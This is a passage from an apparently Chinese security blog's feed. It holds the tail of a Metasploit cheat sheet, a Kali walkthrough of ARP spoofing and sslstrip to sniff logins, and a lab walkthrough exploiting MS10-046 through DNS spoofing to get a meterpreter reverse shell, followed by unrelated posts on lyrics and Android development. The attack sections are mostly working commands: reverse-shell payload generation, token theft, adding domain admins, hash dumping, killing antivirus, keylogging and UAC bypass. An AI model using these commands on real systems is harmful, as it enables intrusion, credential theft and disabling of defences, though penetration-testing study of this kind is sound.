class="line">windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai LHOST=172.16.1.32 LPORT=443 &gt; msf.exe</span><br><span class="line">[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)</span><br><span class="line">root@bt://opt/framework3/msf3<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>这一行命令就可以创建一个攻击载荷并自动产生可执行文件格式。</p><h2 id="八、Meterpreter后渗透攻击阶段命令"><a href="#八、Meterpreter后渗透攻击阶段命令" class="headerlink" title="八、Meterpreter后渗透攻击阶段命令"></a>八、Meterpreter后渗透攻击阶段命令</h2><p>在Windows主机上使用Meterpreter进行提权操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">meterpreter &gt; getsystem</span><br></pre></td></tr></table></figure><p>从一个给定的进程ID中窃取一个域管理员组令牌，添加一个域账户，并把域账户添加到域管理员组中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">meterpreter &gt; steal_token 1784</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net user metasploit p@55w0rd /ADD /DOMAIN</span><br><span class="line">C:\Windows\system32&gt;net group <span class="string">"Domain Admins"</span> metasploit /ADD /DOMAIN</span><br></pre></td></tr></table></figure><p>从SAM数据库中导出密码的哈希值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">meterpreter &gt; hashdump</span><br></pre></td></tr></table></figure><p>提示：在Windows 2008中，如果getsystem命令和hashdump命令导出异常情况时，你需要迁移到一个以SYSMTEM系统权限运行的进程中。</p><p>自动迁移到一个独立进程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run migrate</span><br></pre></td></tr></table></figure><p>通过Meterpreter的killav脚本来杀死目标主机运行的杀毒软件进程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run killav</span><br></pre></td></tr></table></figure><p>针对一个特定的进程捕获目标主机上的键盘记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line">meterpreter &gt; migrate 1436</span><br><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">meterpreter &gt; keyscan_dump</span><br><span class="line">meterpreter &gt; keyscan_stop</span><br></pre></td></tr></table></figure><p>用匿名方式来假冒管理员：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use incognito</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">meterpreter &gt; use priv</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">meterpreter &gt; impersonate_token IHAZSECURITY\\Administrator</span><br></pre></td></tr></table></figure><p>查看目标主机都采取了哪些防护措施，列出帮助菜单，关闭防火墙以及其他我们发现的防护措施：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run getcountermeasure</span><br><span class="line">meterpreter &gt; run getcountermeasure -h</span><br><span class="line">meterpreter &gt; run getcountermeasure -d -k</span><br></pre></td></tr></table></figure><p>识别被控制的主机是否是一台虚拟机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run checkvm</span><br></pre></td></tr></table></figure><p>在一个Meterpreter会话界面中使用cmd shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure><p>获取目标主机的图形界面（VNC）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run vnc</span><br></pre></td></tr></table></figure><p>使正在运行的Meterpreter界面在后台运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br></pre></td></tr></table></figure><p>绕过Windows的用户账户控制（UAC）机制：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/escalate/bypassuac</span><br></pre></td></tr></table></figure><p>导出苹果OS-X系统的口令哈希值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/osx/gather/hashdump</span><br></pre></td></tr></table></figure><p>导出Linux系统的口令哈希值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/linux/gather/hashdump</span><br></pre></td></tr></table></figure><hr><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li>《Metasploit渗透测试指南》附录B</li><li>《Metasploit-The Penetration Tester’s Guide》B:Cheat Sheet</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;以下是Metasploit框架的各种接口与程序中最常使用的命令和语法参考，以及Meterpreter后渗透测试阶段的命令参考，里边的一些“多合一”命令将会大大简化攻击步骤。&lt;/p&gt;
&lt;h2 id=&quot;一、MSF终端命令&quot;&gt;&lt;a href=&quot;#一、MSF终端命令&quot; class=
      
    
    </summary>
    
    
      <category term="Penetration" scheme="https://g2ex.top/tags/Penetration/"/>
    
      <category term="MSF" scheme="https://g2ex.top/tags/MSF/"/>
    
  </entry>
  
  <entry>
    <title>MITM中间人攻击</title>
    <link href="https://g2ex.top/2015/05/18/Man-in-the-Middle-Attack/"/>
    <id>https://g2ex.top/2015/05/18/Man-in-the-Middle-Attack/</id>
    <published>2015-05-18T21:48:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、说明"><a href="#一、说明" class="headerlink" title="一、说明"></a>一、说明</h2><p>整理了一下去年的笔记，简单记录Kali Linux中中间人（Man-in-the-middle， MITM）攻击的过程，该攻击手段常用于公开Wi-Fi网络中窃取用户信息。</p><p>本例中：</p><table><thead><tr><th>设备</th><th>IP地址</th></tr></thead><tbody><tr><td>网关IP</td><td>10.10.10.2</td></tr><tr><td>Kali Linux 1.1.0a</td><td>10.10.10.128</td></tr><tr><td>目标计算机 Windows XP SP3</td><td>10.10.10.129</td></tr></tbody></table><p>使用到的工具有：<code>ettercap</code>、<code>arpspoof</code>、<code>sslstrip.py</code></p><h2 id="二、实施攻击"><a href="#二、实施攻击" class="headerlink" title="二、实施攻击"></a>二、实施攻击</h2><p>可以先用<code>namp</code>工具扫描一下局域网中在线的主机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 10.10.10.1/24</span><br></pre></td></tr></table></figure><h3 id="1-编辑etter-conf"><a href="#1-编辑etter-conf" class="headerlink" title="1) 编辑etter.conf"></a>1) 编辑etter.conf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># if you use iptables:</span></span><br><span class="line">    <span class="comment">#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"</span></span><br></pre></td></tr></table></figure><p>去掉<code>iptables</code>下<code>redir_command_on</code>之前的<code>#</code>，打开iptables功能。</p><h3 id="2-打开Linux核心封包转递功能"><a href="#2-打开Linux核心封包转递功能" class="headerlink" title="2) 打开Linux核心封包转递功能"></a>2) 打开Linux核心封包转递功能</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></span><br></pre></td></tr></table></figure><h3 id="3-设置转发"><a href="#3-设置转发" class="headerlink" title="3) 设置转发"></a>3) 设置转发</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080</span></span><br></pre></td></tr></table></figure><p>把80端口的数据转发到8080端口上，之后可以使用ettercap和sslstrip监听这个端口。</p><h3 id="4-执行arp欺骗"><a href="#4-执行arp欺骗" class="headerlink" title="4) 执行arp欺骗"></a>4) 执行arp欺骗</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># arpspoof  -i eth0 -t 10.10.10.129 10.10.10.2</span></span><br></pre></td></tr></table></figure><p>其中<code>10.10.10.129</code>是要欺骗的目标机器IP地址，<code>10.10.10.2</code>是要伪装成为的网关IP地址。</p><h3 id="5-启动ettercap"><a href="#5-启动ettercap" class="headerlink" title="5) 启动ettercap"></a>5) 启动ettercap</h3><p>新打开一个Terminal，启动ettercap，嗅探8080端口的数据：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ettercap -T -q -l 8080 -i eth0</span></span><br></pre></td></tr></table></figure><h3 id="6-启动sslstrip-py"><a href="#6-启动sslstrip-py" class="headerlink" title="6) 启动sslstrip.py"></a>6) 启动sslstrip.py</h3><p>新打开一个Terminal，进入sslstrip的目录，启动sslstrip.py，分析8080端口的数据，信息将写入目录下的log文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cd /usr/share/sslstrip/</span></span><br><span class="line">root@kali:/usr/share/sslstrip<span class="comment"># python sslstrip.py -k -l 8080 -w log</span></span><br></pre></td></tr></table></figure><h2 id="三、接下来…"><a href="#三、接下来…" class="headerlink" title="三、接下来…"></a>三、接下来…</h2><h3 id="1-http中间人攻击"><a href="#1-http中间人攻击" class="headerlink" title="1) http中间人攻击"></a>1) http中间人攻击</h3><p>在目标及其中打开<code>http://login.live.com/</code>测试，输入用户名密码，点击登陆，在Kali的ettercap Terminal中会显示嗅探到的<code>USER</code>与<code>PASS</code>分别为<code>g2ex@live.com</code>和<code>123456</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP : 131.253.61.100:80 -&gt; USER: g2ex@live.com  PASS: 123456  INFO: http://login.live.com/login.srf?wa=wsignin1.0&amp;ct=1431940505&amp;rver=6.1.6206.0&amp;sa=1&amp;ntprob=-1&amp;wp=MBI_SSL_SHARED&amp;wreply=https://mail.live.com/?owa=1&amp;owas</span><br></pre></td></tr></table></figure><h3 id="2-HTTPS中间人攻击"><a href="#2-HTTPS中间人攻击" class="headerlink" title="2) HTTPS中间人攻击"></a>2) HTTPS中间人攻击</h3><p>因为现阶段Chrome、Firefox和高版本IE都会对伪造的证书进行错误提醒，SSL的中间人攻击已经很容易被察觉。这里为了方便演示，嗅探Yahoo的用户名密码，当使用Firefox提示不受信任的连接时，将网站添加到例外，或者使用IE6访问<code>https://login.yahoo.com/</code>，输入用户名密码，点击<code>Sign In</code>，在Kali的ettercap Terminal中会显示嗅探到的<code>USER</code>与<code>PASS</code>分别为<code>g2ex@yahoo.com</code>和<code>123456</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP : 98.136.189.41:443 -&gt; USER: g2ex@yahoo.com  PASS: 123456  INFO: https://login.yahoo.com/</span><br></pre></td></tr></table></figure><p>这时，也可以查看sslstrip.py目录中的log文件，里边已经记录了一些用户名密码了。</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>针对HTTP非加密的连接，MITM攻击发生时目标机器是没有感知的，中间人可以截取、修改数据，也可以加入广告、恶意Javascript，比如前段时间大炮攻击Github等网站的事件。</p><p>而针对HTTPS的MITM攻击有一定的局限性，除非电脑里已经安装了恶意的证书，否则Chrome、Firefox和最新的IE都会提示证书问题阻止进一步地访问。让人欣喜的是，越来越多的网站加入SSL/TSL行列，常见重要站点的登陆界面也都支持了HTTPS或者私有协议。尤其是当Chrome、Firefox宣布删除CNNIC数字证书之后，我们被GFW中间人的机会就大大减小。</p><p>连接不信任的网络，还是老老实实用自己的加密代理吧，踏实、放心。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、说明&quot;&gt;&lt;a href=&quot;#一、说明&quot; class=&quot;headerlink&quot; title=&quot;一、说明&quot;&gt;&lt;/a&gt;一、说明&lt;/h2&gt;&lt;p&gt;整理了一下去年的笔记，简单记录Kali Linux中中间人（Man-in-the-middle， MITM）攻击的过程，该攻
      
    
    </summary>
    
    
      <category term="Penetration" scheme="https://g2ex.top/tags/Penetration/"/>
    
      <category term="Kali" scheme="https://g2ex.top/tags/Kali/"/>
    
      <category term="MITM" scheme="https://g2ex.top/tags/MITM/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit Framework 快捷方式漏洞利用示例</title>
    <link href="https://g2ex.top/2015/05/15/MSF-MS10_046/"/>
    <id>https://g2ex.top/2015/05/15/MSF-MS10_046/</id>
    <published>2015-05-15T16:30:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、说明"><a href="#一、说明" class="headerlink" title="一、说明"></a>一、说明</h2><p>本文简单记录Kali Linux中使用Metasploit Framework入侵Windows XP的过程，利用的是古老的ms10_046快捷方式漏洞。</p><p>渗透测试平台Kali与靶机XP的IP地址分别如下：</p><table><thead><tr><th>系统</th><th>IP地址</th></tr></thead><tbody><tr><td>Kali Linux 1.1.0a</td><td>10.10.10.128</td></tr><tr><td>Windows XP SP3</td><td>10.10.10.129</td></tr></tbody></table><h2 id="二、配置Ettercap"><a href="#二、配置Ettercap" class="headerlink" title="二、配置Ettercap"></a>二、配置Ettercap</h2><p>这里用到了Ettercap的DNS欺骗功能。</p><h3 id="1-配置etter-conf"><a href="#1-配置etter-conf" class="headerlink" title="1) 配置etter.conf"></a>1) 配置<code>etter.conf</code></h3><p>使用<code>locate</code>命令找到<code>etter.conf</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># locate etter.conf</span></span><br><span class="line">/etc/ettercap/etter.conf</span><br></pre></td></tr></table></figure><p>vim编辑<code>etter.conf</code>，把以下两项的数值改为非默认值：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[privs]</span></span><br><span class="line"><span class="attr">ec_uid</span> = <span class="number">65534</span>                <span class="comment"># nobody is the default</span></span><br><span class="line"><span class="attr">ec_gid</span> = <span class="number">65534</span>                <span class="comment"># nobody is the default</span></span><br></pre></td></tr></table></figure><p>启用iptables：<br>iptables是一个配置Linux内核防火墙的命令行工具，它可以检测、修改、转发、重定向和丢弃 IPv4 数据包。<br>在<code>etter.conf</code>中找到<code># if you use iptables:</code>，删除接下来的两行<code>redir_command_on = …</code>与<code>redir_command_off = …</code>前面的<code>#</code>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># if you use iptables:</span></span><br><span class="line">   redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"</span><br><span class="line">   redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"</span><br></pre></td></tr></table></figure><h3 id="2-配置etter-dns"><a href="#2-配置etter-dns" class="headerlink" title="2) 配置etter.dns"></a>2) 配置<code>etter.dns</code></h3><p>使用<code>locate</code>命令找到<code>etter.dns</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># locate etter.dns</span></span><br><span class="line">/etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure><p>编辑<code>etter.dns</code>，在最后添加：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*.com A 10.10.10.128</span><br><span class="line">*.cn A 10.10.10.128</span><br><span class="line">*.net A 10.10.10.128</span><br></pre></td></tr></table></figure><p>其中<code>*.com/cn/net</code>是要欺骗的域名。</p><h3 id="3-启动Ettercap，开启局域网的DNS欺骗"><a href="#3-启动Ettercap，开启局域网的DNS欺骗" class="headerlink" title="3) 启动Ettercap，开启局域网的DNS欺骗"></a>3) 启动Ettercap，开启局域网的DNS欺骗</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ettercap -T -q -i eth0 -P dns_spoof // //</span></span><br></pre></td></tr></table></figure><p>这样，当靶机访问<code>*.com/cn/net</code>网站的时候，都会重定向到Kali Linxu。</p><p>例如，当在WinXP中访问<code>www.baidu.com</code>，Kali的Terminal中会显示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns_spoof: [www.baidu.com] spoofed to [10.10.10.128]</span><br></pre></td></tr></table></figure><p>如果启动ettercap时提示<code>Incorrect number of token (///) in TARGET !!</code>，试着把参数<code>//</code>替换为<code>///</code>。这是因为IPv6需要在目标字段中额外添加一个<code>/</code>。</p><h2 id="三、MSF的使用"><a href="#三、MSF的使用" class="headerlink" title="三、MSF的使用"></a>三、MSF的使用</h2><p>另外打开一个Terminal，使用<code>msfconsole</code>命令启动MSF。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用ms10_046漏洞</span></span><br><span class="line">msf &gt; use exploit/windows/browser/ms10_046_shortcut_icon_dllloader </span><br><span class="line"><span class="comment"># 使用show option命令查看需要设置的字段，这里设置SRVHOST为本机IP地址</span></span><br><span class="line">msf exploit(ms10_046_shortcut_icon_dllloader) &gt; <span class="built_in">set</span> SRVHOST 10.10.10.128</span><br><span class="line">SRVHOST =&gt; 10.10.10.128</span><br><span class="line"><span class="comment"># 设置PAYLOAD为reverse_tcp</span></span><br><span class="line">msf exploit(ms10_046_shortcut_icon_dllloader) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="comment"># 使用show option命令查看需要设置的字段，这里设置LHOST为本机IP地址</span></span><br><span class="line">msf exploit(ms10_046_shortcut_icon_dllloader) &gt; <span class="built_in">set</span> LHOST 10.10.10.128</span><br><span class="line">LHOST =&gt; 10.10.10.128</span><br><span class="line"><span class="comment"># 使用exploit命令开始执行！</span></span><br><span class="line">msf exploit(ms10_046_shortcut_icon_dllloader) &gt; exploit</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"></span><br><span class="line">[*] Started reverse handler on 10.10.10.128:4444 </span><br><span class="line">[*] Send vulnerable clients to \\10.10.10.128\fJeXlyh\.</span><br><span class="line">[*] Or, get clients to save and render the icon of http://&lt;your host&gt;/&lt;anything&gt;.lnk</span><br><span class="line">[*] Using URL: http://10.10.10.128:80/</span><br><span class="line">[*] Server started.</span><br><span class="line">msf exploit(ms10_046_shortcut_icon_dllloader) &gt;</span><br></pre></td></tr></table></figure><p>使用<code>exploit</code>启动漏洞利用程序后，可以看到<code>Using URL: http://10.10.10.128:80/</code>一行，意思是有漏洞的靶机访问<code>http://10.10.10.128/</code>时就会中招。前面之所以使用Ettercap，因为它可以把网段中所有访问<code>*.com/cn/net</code>的网址都重定向到<code>10.10.10.128</code>。</p><p>以上MSF的攻击步骤看似命令繁琐，其实只用到了以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/browser/ms10_046_shortcut_icon_dllloader</span><br><span class="line"><span class="built_in">set</span> SRVHOST 本机IP</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 本机IP</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>在靶机XP中打开浏览器输入网址，在Kali的Terminal中就可以看到入侵成功，建立会话连接了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Meterpreter session 1 opened (10.10.10.128:4444 -&gt; 10.10.10.129:1054) at 2015-05-15 10:54:09 +0800</span><br></pre></td></tr></table></figure><p>最后，鱼已上钩，关闭Ettercap。</p><p>在MSF中使用<code>sessions</code>命令查看已经建立的连接，使用<code>sessions -i 会话号</code>进入会话。<code>background</code> <code>cat</code> <code>cd</code>与<code>pwd</code> <code>clearev</code> <code>download</code>与<code>upload</code> <code>edit</code> <code>execute</code> <code>getpid</code> <code>getsystem</code> <code>getuid</code> <code>hashdump</code> <code>idletime</code> <code>ipconfig</code> <code>lpwd</code> <code>lcd</code> <code>ls</code> <code>migrate</code> <code>ps</code> <code>resource</code> <code>search</code> <code>shell</code> <code>sysinfo</code> <code>screenshot</code> <code>webcam_list</code> <code>webcam_snap</code> 这些命令就可以派上用场了。Meterpreter命令的使用请参考 <a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/</a> 。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、说明&quot;&gt;&lt;a href=&quot;#一、说明&quot; class=&quot;headerlink&quot; title=&quot;一、说明&quot;&gt;&lt;/a&gt;一、说明&lt;/h2&gt;&lt;p&gt;本文简单记录Kali Linux中使用Metasploit Framework入侵Windows XP的过程，利用的是古老的
      
    
    </summary>
    
    
      <category term="Penetration" scheme="https://g2ex.top/tags/Penetration/"/>
    
      <category term="MSF" scheme="https://g2ex.top/tags/MSF/"/>
    
      <category term="Kali" scheme="https://g2ex.top/tags/Kali/"/>
    
  </entry>
  
  <entry>
    <title>黄粱一梦二十年</title>
    <link href="https://g2ex.top/2015/03/13/Fond-Dream/"/>
    <id>https://g2ex.top/2015/03/13/Fond-Dream/</id>
    <published>2015-03-13T22:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p>黄粱一梦二十年</p><p>依旧是不懂爱也不懂情</p><p>写歌的人假正经阿</p><p>听歌的人最无情</p><p>于是歌手从吉林到北京</p><p>从台北到上海</p><p>伦敦到马德里</p><p>去寻找他梦中的青鸟</p><p>郎对花 姐对花 是一段不知道是怎么开始</p><p>也不知道要怎么样结束的旅程 一对对到人间</p><p>他发觉…这世间…有点假 这个人间有点假</p><p>可我莫名的 爱上了她… 可我莫名爱上了她</p><p>莫非再过二十年</p><p>依旧是不懂爱也不懂情</p><p>写歌的人断了魂阿</p><p>听歌的人最无情</p><hr><blockquote><p>来自<code>qii</code>的<a href="https://github.com/qii/weiciyuan" target="_blank" rel="noopener">四次元</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;黄粱一梦二十年&lt;/p&gt;
&lt;p&gt;依旧是不懂爱也不懂情&lt;/p&gt;
&lt;p&gt;写歌的人假正经阿&lt;/p&gt;
&lt;p&gt;听歌的人最无情&lt;/p&gt;
&lt;p&gt;于是歌手从吉林到北京&lt;/p&gt;
&lt;p&gt;从台北到上海&lt;/p&gt;
&lt;p&gt;伦敦到马德里&lt;/p&gt;
&lt;p&gt;去寻找他梦中的青鸟&lt;/p&gt;
&lt;p&gt;郎对花 姐对花 是一
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android SDK更新可用Hosts</title>
    <link href="https://g2ex.top/2015/01/21/Android-SDK-Hosts/"/>
    <id>https://g2ex.top/2015/01/21/Android-SDK-Hosts/</id>
    <published>2015-01-21T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p>hosts文件中添加：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Android SDK</span></span><br><span class="line">74.125.113.121 developer.android.com</span><br><span class="line">203.208.46.146 dl.google.com</span><br><span class="line">203.208.46.146 dl-ssl.google.com</span><br><span class="line"><span class="comment"># End Android SDK</span></span><br></pre></td></tr></table></figure><p>Android SDK Manager <code>Tools</code> -&gt; <code>Options</code>，勾选 <code>Force https://... sources to be fetched using http://...</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;hosts文件中添加：&lt;/p&gt;
&lt;figure class=&quot;highlight ini&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/spa
      
    
    </summary>
    
    
      <category term="Hosts" scheme="https://g2ex.top/tags/Hosts/"/>
    
      <category term="Android" scheme="https://g2ex.top/tags/Android/"/>
    
      <category term="SDK" scheme="https://g2ex.top/tags/SDK/"/>
    
  </entry>
  
  <entry>
    <title>Android NDK开发笔记</title>
    <link href="https://g2ex.top/2015/01/18/Android-Ndk-Notes/"/>
    <id>https://g2ex.top/2015/01/18/Android-Ndk-Notes/</id>
    <published>2015-01-18T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p>在Android开发中需要实现一个加解密功能，为了增加被逆向的难度，决定使用JNI实现该功能。使用C/C++编写代码，编译链接成<code>.so</code>动态库，提供给Java调用。本文简单总结了Eclipse中Android NDK环境的搭建过程，编写了一个JNI的小例子，记录了一些开发中遇到的问题。</p><h2 id="一、Android-NDK与JNI简介"><a href="#一、Android-NDK与JNI简介" class="headerlink" title="一、Android NDK与JNI简介"></a>一、Android NDK与JNI简介</h2><p>Android NDK（Native Development Kit ）是一套工具集合，允许用C/C++语言实现应用程序的一部分功能。</p><p>JNI（Java Native Interface）是Java的一种机制，允许使用其他语言（汇编、C/C++等）编写代码，并封装成动态库被Java调用。也就是说JNI提供了一个在Java平台上调用C/C++的一种途径，NDK是Android对JNI实现的一种支持。</p><p>关于JNI的理解，请参考<a href="http://www.cnblogs.com/mandroid/archive/2011/06/15/2081093.html" target="_blank" rel="noopener">《JAVA基础之理解JNI原理》</a>，文中的图片介绍简单直观：<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-01-17_170900.webp" alt="JNI" title="理解JNI原理"></p><h2 id="二、Eclipse-NDK环境搭建"><a href="#二、Eclipse-NDK环境搭建" class="headerlink" title="二、Eclipse NDK环境搭建"></a>二、Eclipse NDK环境搭建</h2><p>准备工作：</p><ul><li>下载 <a href="https://eclipse.org/downloads/" target="_blank" rel="noopener">Eclipse</a>、<a href="https://eclipse.org/cdt/" target="_blank" rel="noopener">Eclipse CDT插件</a></li><li>下载 <a href="http://developer.android.com/sdk/index.html#Other" target="_blank" rel="noopener">Android SDK</a>、<a href="http://developer.android.com/tools/sdk/ndk/index.html" target="_blank" rel="noopener">Android NDK</a>、<a href="http://developer.android.com/tools/sdk/eclipse-adt.html" target="_blank" rel="noopener">Android ADT插件</a></li></ul><ol><li>解压Eclipse，同时安装Android SDK和NDK；</li><li>安装CDT：Eclipse <code>help</code>-&gt;<code>Instlal New Software...</code>，选择已下载的CDT；</li><li>安装ADT：Eclipse <code>help</code>-&gt;<code>Instlal New Software...</code>，选择已下载的ADT，安装过程中确认选中了<code>NDK Plugin</code>；</li><li>配置SDK/NDK：Eclipse 